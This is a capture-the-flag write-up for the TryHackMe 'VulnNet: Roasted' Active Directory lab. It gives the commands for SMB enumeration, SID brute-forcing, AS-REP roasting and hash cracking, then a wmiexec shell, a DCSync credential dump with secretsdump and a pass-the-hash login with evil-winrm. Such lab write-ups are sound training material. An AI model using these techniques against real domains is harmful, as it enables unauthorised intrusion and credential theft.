# Active Directory Room
## VulnNet: Roasted Tryhackme (writeup)



Room: https://tryhackme.com/room/vulnnetroasted

### Tasks

User.txt


System.txt

IP= 10.10.250.145
>## 1- Nmap
 ```
 root@ubuntu:~# nmap -sC -sV -Pn -n -A 10.10.250.145

```
Output

Domain: vulnnet-rst.local

Netbios name: WIN-2BO8M1OE1M1



>## 2-Enumerate SMB

 ```
 root@ubuntu:~# smbclient -L \\\\10.10.250.145
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing

```
>## Username enumerate
we will use lookupsid.py
```
root@ubuntu:~# lookupsid.py anonymous@10.10.250.145

Password:
[*] Brute forcing SIDs at 10.10.250.145
[*] StringBinding ncacn_np:10.10.250.145[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)

```
create file with above users

>## GetNPUsers
```
root@ubuntu:~# GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -no-pass -dc-ip 10.10.250.145
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:85f4545ec4be97312a8824a26a0b9afa$010e2f219d16ea3af09d2da1d102[HIDEEN]

```
above command used to hash found

>## Crack Hashe
```
root@ubuntu:~# john  --wordlist=/root/THM/rockyou.txt hashe.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])

```
Found password

>## Smbclient

```
root@ubuntu:~# smbclient  -U t-skid \\\\10.10.250.145\\NETLOGON
Enter WORKGROUP\t-skid's password:

```
 ````
 smb: \> ls
  .                                   
  ..                                  
  ResetPassword.vbs                   

		
smb: \> get ResetPassword.vbs
````

````

smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs 
smb: \> 
````

````
root@ubuntu:~# cat ResetPassword.vbs 


````
CREDENTIALS are above in above file

>## wmiexec.py

Using credentials found above
```
root@ubuntu:~# wmiexec.py vulnnet-rst.local/a-whitehat@10.10.116.57

```
you got shell and try to find user.txt

```
c:\>dir
c:\>cd Users
c:\Users>dir
c:\Users>cd enterprise-core-vn
c:\Users\enterprise-core-vn>dir
c:\Users\enterprise-core-vn>cd Desktop

c:\Users\enterprise-core-vn\Desktop>dir
c:\Users\enterprise-core-vn\Desktop>cat user.txt
THM{xyz}

````
 ## Privilege

DCSync attack

>## secretsdump.py

```
root@ubuntu:~# secretsdump.py vulnnet-rst.local/a-whitehat:******************@10.10.250.145

Administrator:c25xxxxxxx

```
## try to login with above hash of Admin

```
root@ubuntu:~# evil-winrm -i 10.10.250.145 -u Administrator -H c25xxxxxc3b09d

Evil-WinRM shell v2.3

\Users\Administrator\Documents> cd c:\Users\Administrator\Desktop
c:\Users\Administrator\Desktop> dir
system.txt
C:\Users\Administrator\Desktop> cat system.txt
THM{16xyz}

```
